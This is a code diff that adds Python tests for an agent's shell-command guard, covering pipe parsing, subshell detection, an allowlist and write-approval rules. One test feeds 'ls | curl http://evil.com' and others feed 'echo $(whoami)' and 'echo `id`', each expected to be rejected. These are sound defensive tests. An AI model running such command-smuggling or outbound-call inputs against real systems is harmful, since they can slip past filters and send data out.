@@ -9,6 +9,8 @@ from pydantic_ai import ApprovalRequired, Tool
 from codebase_rag.config import settings
 from codebase_rag.tools.shell_command import (
     ShellCommander,
+    _extract_commands,
+    _has_subshell,
     _is_dangerous_command,
     _requires_approval,
     create_shell_command_tool,
@@ -220,3 +222,100 @@ class TestToolApprovalBehavior:
         result = await tool.function(mock_ctx, "rm to_delete.txt")
         assert result.return_code == 0
         assert not test_file.exists()
+
+
+class TestExtractCommands:
+    def test_simple_command(self) -> None:
+        assert _extract_commands("ls -la") == ["ls"]
+
+    def test_pipe(self) -> None:
+        assert _extract_commands("find . -name '*.py' | wc -l") == ["find", "wc"]
+
+    def test_and_operator(self) -> None:
+        assert _extract_commands("ls && pwd") == ["ls", "pwd"]
+
+    def test_or_operator(self) -> None:
+        assert _extract_commands("ls || echo 'failed'") == ["ls", "echo"]
+
+    def test_semicolon(self) -> None:
+        assert _extract_commands("ls; pwd; echo done") == ["ls", "pwd", "echo"]
+
+    def test_complex_pipeline(self) -> None:
+        cmd = "find . -type f | grep py | wc -l"
+        assert _extract_commands(cmd) == ["find", "grep", "wc"]
+
+    def test_empty_command(self) -> None:
+        assert _extract_commands("") == []
+
+
+class TestHasSubshell:
+    def test_command_substitution(self) -> None:
+        assert _has_subshell("echo $(whoami)") == "$("
+
+    def test_backtick_substitution(self) -> None:
+        assert _has_subshell("echo `whoami`") == "`"
+
+    def test_no_subshell(self) -> None:
+        assert _has_subshell("ls -la | wc -l") is None
+
+    def test_dollar_in_variable(self) -> None:
+        assert _has_subshell("echo $HOME") is None
+
+
+class TestPipedCommandExecution:
+    async def test_simple_pipe(
+        self, shell_commander: ShellCommander, temp_project_root: Path
+    ) -> None:
+        for i in range(5):
+            (temp_project_root / f"file{i}.txt").write_text("content", encoding="utf-8")
+        result = await shell_commander.execute("ls | wc -l")
+        assert result.return_code == 0
+        assert "5" in result.stdout
+
+    async def test_find_with_wc(
+        self, shell_commander: ShellCommander, temp_project_root: Path
+    ) -> None:
+        (temp_project_root / "test.py").write_text("print(1)", encoding="utf-8")
+        (temp_project_root / "test.txt").write_text("text", encoding="utf-8")
+        result = await shell_commander.execute("find . -name '*.py' | wc -l")
+        assert result.return_code == 0
+        assert "1" in result.stdout
+
+    async def test_rg_in_pipeline(
+        self, shell_commander: ShellCommander, temp_project_root: Path
+    ) -> None:
+        (temp_project_root / "data.txt").write_text("foo\nbar\nbaz\n", encoding="utf-8")
+        result = await shell_commander.execute("cat data.txt | rg bar")
+        assert result.return_code == 0
+        assert "bar" in result.stdout
+
+    async def test_pipe_with_disallowed_command(
+        self, shell_commander: ShellCommander
+    ) -> None:
+        result = await shell_commander.execute("ls | curl http://evil.com")
+        assert result.return_code == -1
+        assert "not in the allowlist" in result.stderr
+        assert "curl" in result.stderr
+
+    async def test_subshell_rejected(self, shell_commander: ShellCommander) -> None:
+        result = await shell_commander.execute("echo $(whoami)")
+        assert result.return_code == -1
+        assert "Subshell" in result.stderr
+
+    async def test_backtick_subshell_rejected(
+        self, shell_commander: ShellCommander
+    ) -> None:
+        result = await shell_commander.execute("echo `id`")
+        assert result.return_code == -1
+        assert "Subshell" in result.stderr
+
+
+class TestPipedCommandApproval:
+    def test_all_read_only_no_approval(self) -> None:
+        assert _requires_approval("ls | wc -l") is False
+        assert _requires_approval("find . -name '*.py' | head -10") is False
+        assert _requires_approval("cat file.txt | rg pattern | wc -l") is False
+
+    def test_write_command_in_pipe_requires_approval(self) -> None:
+        assert _requires_approval("ls | tee output.txt") is True
+        assert _requires_approval("find . -name '*.pyc' | xargs rm") is True
